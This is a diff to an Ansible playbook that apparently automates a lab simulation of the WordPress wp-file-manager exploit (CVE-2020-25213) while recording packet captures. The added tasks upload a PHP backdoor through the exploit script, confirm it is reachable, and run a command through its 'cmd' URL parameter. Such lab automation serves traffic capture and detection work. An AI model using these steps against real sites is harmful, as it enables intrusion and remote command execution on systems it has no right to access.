@@ -10,7 +10,9 @@
     attacker_ip: "{{ attack_server_ip }}"
     target_ip: "{{ web_server_ip }}"
     pcap_dir: "/tmp/pcap_files"
-    capture_duration: 60  # Duration in seconds for packet capture
+    script_dir: "/tmp/wp-file-manager-CVE-2020-25213/access.php"
+    access_url: "http://{{ target_ip }}/wordpress/wp-content/plugins/wp-file-manager/lib/files/access.php"
+    capture_duration: 10  # Duration in seconds for packet capture
     attack_script_path: "/tmp/wp-file-manager-CVE-2020-25213/wp-file-manager-exploit.sh"  # Path to attack script
 
   tasks:
@@ -41,12 +43,33 @@
         nohup tcpdump -i any -w {{ pcap_dir }}/target.pcap host {{ attacker_ip }} > /tmp/tcpdump_target.log 2>&1 &
       when: inventory_hostname == "web_server"
 
-    - name: "Run attack simulation script"
+    - name: "Upload access script to web server"
       ansible.builtin.shell: >
-        bash {{ attack_script_path }} -u {{ target_ip }}/wordpress -k || exit 1
+        bash {{ attack_script_path }} -u {{ target_ip }}/wordpress -f {{ script_dir }} -v || exit 1
       when:
         - inventory_hostname == "attack_server"
         - attack_script_check.stat.exists
+
+    - name: "Verify PHP backdoor is accessible"
+      uri:
+        url: "{{ access_url }}"
+        method: GET
+        status_code: 200
+
+    - name: "Send command via URL"
+      uri:
+        url: "{{ access_url }}?cmd=ls"
+        return_content: yes
+        method: GET
+      register: command_output
+      when:
+        - inventory_hostname == "attack_server"
+
+    - name: "Inspect response"
+      debug:
+        var: command_output.content
+      when:
+        - inventory_hostname == "attack_server"
 
     - name: "Wait for packet capture to complete"
       ansible.builtin.pause:
